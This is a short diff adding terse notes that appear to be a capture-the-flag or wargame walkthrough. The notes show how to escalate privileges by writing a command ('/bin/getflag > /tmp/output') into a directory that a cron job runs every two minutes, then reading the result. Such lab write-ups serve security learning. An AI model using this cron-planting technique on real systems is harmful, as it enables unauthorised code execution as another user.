@@ -1,0 +1,6 @@
+/var/mail
+crontab each 2 min
+ cat /usr/sbin/openarenaserver
+ echo "/bin/getflag > /tmp/output" > /opt/openarenaserver/tmp
+ wait 2 minutes
+ /tmp$ cat output
